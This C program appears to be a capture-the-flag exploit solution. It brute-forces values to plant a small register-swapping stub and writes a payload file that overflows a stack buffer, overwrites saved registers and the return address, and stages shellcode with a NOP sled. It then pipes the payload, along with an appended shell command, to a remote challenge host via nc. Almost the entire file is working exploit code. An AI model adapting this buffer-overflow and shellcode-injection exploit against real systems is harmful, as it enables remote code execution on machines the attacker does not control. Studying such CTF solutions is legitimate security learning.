#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FILENAME "./evilfile.txt"
#define RETURN_ADDRESS "\x00\x40\x41\x41"
#define COMMAND "nc tmp.plctf.net 30000"
#define SHELLCODE "./shellcode"

/*
 My solution is basically to, within the first 8 bytes (which are easy to bruteforce)
 set up a call to sys_read. That call can read any amount of shellcode into the rest
 of the buffer (up to the maximum size of 0x1000).

 As a reminder to myself:

 read(fd, buf, count)

 eax = 3 (sys_read) - Have to set
 ebx = 0 (stdin)    - I can pre-set this
 ecx = [buffer]     - Have to set
 edx = length       - Have to set

 I control ebx, edi, esi, and ebp at the time that main() returns. As
 such, if I carefully prepare my registers, I can do this:

 87 cf         xchg ecx, edi
 96            xchg eax, esi
 87 d5         xchg edx, ebp
 cd 80         int 80h

 For a grand total of 7 bytes:

 87 cf 96 87 d5 cd 80 ??
*/


#define INIT "\x87\xcf\x96\x87\xd5\xcd\x80\x00"

/* Set up the two DWORD values */
#define INSTRUCTION1 ((int*)INIT)[0]
#define INSTRUCTION2 ((int*)INIT)[1]

/* Because our second instruction is only 24 bits, create a mask */
#define INSTRUCTION2_BITS 0x00ffffff 

/* We'll just choose the biggest possible modulus */
#define MOD               0xffffffff

int main(int argc, const char *argv[])
{
  int multiplier = 0;
  FILE *f;
  int shellcode_size;
  int buf_size;

  /* This is as much room as I have anyway... */
  char shellcode[0x1000];

  if(argc != 2)
  {
    fprintf(stderr, "Usage: %s <command>\n", argv[0]);
    exit(1);
  }

  /* I'm just adding these checks for fun, they aren't supposed to be
   * clean and secure :) */
  if(strlen(argv[1]) > 3000)
  {
    fprintf(stderr, "That's getting uncomfortably long...\n");
  }

  if(strlen(argv[1]) > 3500)
  {
    fprintf(stderr, "That's what she said!\n");
    exit(1);
  }

  f = fopen(SHELLCODE, "rb");
  if(!f)
  {
    fprintf(stderr, "Couldn't open shellcode file: "SHELLCODE);
    exit(1);
  }
  shellcode_size = fread(shellcode, 1, 0x1000, f);
  shellcode[shellcode_size] = '\0';

  /* Yes, I'm using unsafe operations here, but it's purely local */
  strcat(shellcode, " ");
  strcat(shellcode, argv[1]);    /* Append the user's command */
  strcat(shellcode, "; sleep 1; exit;"); /* Add a delay, which is required */
  shellcode_size = strlen(shellcode) + 1;

  if(strlen(shellcode) > 0x1000)
  {
    fprintf(stderr, "oops! Bad stuff is gonna happen :(\n");
    /* Forget aborting, just have fun! */
    /* abort(); */
  }

  /* This brute-forces the proper multiplier to get the second 4 bytes
   * to the correct value (note: this is do-able for a full 32-bit
   * instruction, but takes a minute or two) */
  while ((((INSTRUCTION1 * multiplier + INSTRUCTION1) % MOD) & INSTRUCTION2_BITS) != INSTRUCTION2)
    multiplier++;

  printf("\n");
  printf("multiplier = %u\n", multiplier);
  printf("increment = %u\n", INSTRUCTION1);
  printf("mod = %u\n", MOD);
  printf("\n");

  /* Open the file that we're going to pipe into the process */
  f = fopen(FILENAME, "w");

  /* How the code changes at each step */
  fprintf(f, "%u\n", multiplier);

  /* Code that gets run */
  fprintf(f, "%u\n", INSTRUCTION1);

  /* Mod is the calculated modulous at each step, and is also where
   * we're going to overflowt he buffer */
  buf_size = fprintf(f, "%u", MOD);

  /* This prints enough NULL bytes to exactly overflow the buffer. */
  fwrite("\0\0\0\0\0\0\0\0\0\0\0\0", 1, 12 - buf_size, f);

  /* The next three variables are passed to mmap() as the address
   * protection, and flags. */
  fwrite(RETURN_ADDRESS,     1, 4, f); /* address */
  fwrite("\x07\x00\x00\x00", 1, 4, f); /* protection */
  fwrite("\x22\x00\x00\x00", 1, 4, f); /* flags */

  /* These overwrite the 'saved registers' on the stack, but are useful
   * for setting up the registers */
  fwrite("\x00\x00\x00\x00", 1, 4, f); /* ebx - stdin file handle*/
  fwrite("\x03\x00\x00\x00", 1, 4, f); /* esi - sys_read number so we can xchg it */
  fwrite(RETURN_ADDRESS,     1, 4, f); /* edi - return address so we can xchg it */
  fwrite(&shellcode_size,    1, 4, f); /* ebp - size of shellcode so we can xchg it */

  /* This is the return address on the stack */
  fwrite(RETURN_ADDRESS,     1, 4, f);

  /* Finally, end the line with a newline */
  fwrite("\n",               1, 1, f);

  /* If all goes according to plan, this will call read() on stdin,
   * which allows us to change the code that's currently running to
   * arbitrary code. */

  /* read() is going to return into buf+7, so add a little padding to be
   * safe */
  fwrite("\x90\x90\x90\x90\x90\x90\x90\x90", 1, 8, f);

  /* Send the shellcode, which will be read right over top of what is
   * current running. */
  fwrite(shellcode, 1, strlen(shellcode)+1, f);

  /* Close up the file */
  fclose(f);

  /* Now that everything's in place, run this thing! */
  system(COMMAND " < " FILENAME " | grep -v 0x");

  return 0;
}
